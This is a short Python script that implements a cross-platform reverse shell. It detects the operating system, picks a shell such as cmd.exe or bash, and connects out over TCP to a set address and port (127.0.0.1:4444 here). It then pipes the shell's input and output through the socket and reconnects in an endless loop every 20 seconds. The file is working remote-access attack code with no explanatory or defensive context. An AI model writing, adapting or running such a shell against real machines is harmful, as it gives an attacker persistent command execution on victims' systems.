import os, socket, subprocess,threading, random, http.client, time

def checkOS():
    arrValidOS = ['windows', 'linux', 'darwin', 'openbsd', 'macos']
    import platform
    strPlatform = str(platform.platform())
    for strValidOS in arrValidOS:
        if strValidOS in strPlatform.lower(): return strValidOS, strPlatform
    return "unknown", strPlatform

def findCorrectShell(strPlatform: str = ""):
    arrWindows = ["\\windows\\system32\\cmd.exe"]
    arrLinuxBasic = ["/bin/zsh", "/bin/bash"]
    arrOpenBSD = ["/bin/zsh", "/bin/ksh", "/bin/sh"]
    
    if "" == strPlatform: strOS, _ = checkOS()
    else: strOS = strPlatform

    arrUsed = []
    if "windows" == strOS: arrUsed = arrWindows
    elif strOS in ['linux', 'darwin', 'macos']: arrUsed = arrLinuxBasic
    elif "openbsd" == strOS: arrUsed = arrOpenBSD
    else: raise TypeError(f"{strOS} unsupported")
    
    for strShell in arrUsed:
        if os.path.isfile(strShell): return str(strShell)

class rShellby:
    def __init__(self, ippassedPassed, portpassedPassed: str=4444, opsysPassed: str=""):
        self.strIP = ippassedPassed
        self.intPort = portpassedPassed
        self.strOpSys = opsysPassed
    def receiveOutput(self, objSocketPassed, objPopenPassed):
        while True:
            objData = objSocketPassed.recv(1024)
            if len(objData) > 0:
                objPopenPassed.stdin.write(objData)
                objPopenPassed.stdin.flush()

    def sendInput(self, objSocketPassed, objPopenPassed):
        while True: objSocketPassed.send(objPopenPassed.stdout.read(1))

    def runThread(self, strStage: str="receive"):
        if "receive" == strStage: 
            objThread = threading.Thread(target=self.receiveOutput, args=self.listArgs)
        elif "send" == strStage:
            objThread = threading.Thread(target=self.sendInput, args=self.listArgs)
        objThread.daemon = True
        objThread.start()

    def startShell(self):
        objSocket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        objSocket.connect((self.strIP,self.intPort))
        strShell = findCorrectShell(self.strOpSys)
        objPopen=subprocess.Popen([strShell], 
                            stdout=subprocess.PIPE, 
                            stderr=subprocess.STDOUT, 
                            stdin=subprocess.PIPE)
        self.listArgs = [objSocket, objPopen]
        self.runThread("receive")
        self.runThread("send")
        try: objPopen.wait()
        except KeyboardInterrupt: objPopen.close()


while True: 
    rShellby("127.0.0.1", 4444).startShell()
    time.sleep(20)
